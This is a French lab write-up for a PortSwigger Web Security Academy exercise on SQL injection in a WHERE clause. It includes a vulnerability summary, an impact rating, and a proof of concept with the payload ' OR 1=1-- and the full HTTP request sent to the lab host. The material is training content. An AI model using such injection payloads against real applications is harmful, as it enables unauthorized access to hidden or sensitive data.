# 🐛 Lab : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
**Catégorie :** Injection SQL (SQLi)
**Plateforme :** PortSwigger Web Security Academy
**Date :** 5 Juin 2026

---

## 📄 Rapport de Vulnérabilité

### 📌 Résumé de la Vulnérabilité
L'application web est vulnérable à une Injection SQL (SQLi) classique dans sa fonctionnalité de filtrage des produits. Le paramètre GET `category` n'est pas correctement assaini, ce qui permet à un attaquant de s'échapper de la chaîne de caractères et de manipuler la clause `WHERE` de la requête SQL exécutée en backend.

### 🚨 Impact
**Niveau de criticité : Élevé**
En modifiant la logique de la requête SQL, un attaquant non authentifié peut contourner les restrictions mises en place par l'application. Dans ce scénario, cela permet d'accéder à l'intégralité du catalogue, y compris les données cachées (produits avec le statut "unreleased"). Sur une base de données critique, cela pourrait mener à une fuite d'informations sensibles.

### 🛠️ Preuve de Concept (PoC)
1. Intercepter la navigation vers la page de filtrage des produits.
2. Injecter le payload `' OR 1=1--` dans le paramètre `category` pour forcer une condition toujours vraie et commenter le reste de la requête d'origine.
3. **Requête HTTP finale permettant l'exploitation :**

```http
GET /filter?category=Gifts'+OR+1=1-- HTTP/2
Host: 0abb00b304b9ddbe8149531c0029004f.web-security-academy.net
Cookie: session=oaeYbI16yTvpuOxP4W762ccSqHQfh4L3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: [https://0abb00b304b9ddbe8149531c0029004f.web-security-academy.net/filter?category=Gifts](https://0abb00b304b9ddbe8149531c0029004f.web-security-academy.net/filter?category=Gifts)
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
